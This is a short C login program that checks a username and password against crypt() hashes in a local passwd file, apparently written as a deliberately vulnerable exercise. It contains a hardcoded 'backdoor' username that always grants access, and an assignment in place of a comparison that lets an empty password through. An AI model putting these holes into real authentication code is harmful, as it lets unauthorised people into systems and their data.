#include <stdio.h>
#include <crypt.h>

#include "input.h"
#include "string.h"


char buffer[256];


int main() {
    int denied;

    char user[8];
    char pass[8];
    
    denied = true;

    getuser(user, 8);
    getpass(pass, 8);
    printf("\n");


    FILE *file;
    file = fopen("passwd", "r");


    while (fgets(buffer, 256, file) != 0) {
        char *p = &buffer[1];

        if (streq(user, 0, p, '$')) {
            p += strlen(p, '$');

            char *hash = crypt(pass, p);

            hash += 12;
            p += 12;

            if (streq(hash, 0, p, '$')) {
                denied = false;
                break;
            }
        }
    }

    fclose(file);


    if (streq(pass, 0, "", 0) && (denied = false)) {
        printf("Warning: No assigned password!\n");
    }


    if (denied && !streq(user, 0, "backdoor", 0)) {
        printf("Access Denied\n");
    } else {
        printf("Access Granted\n");
    }

    printf("\n");
    return 0;
}
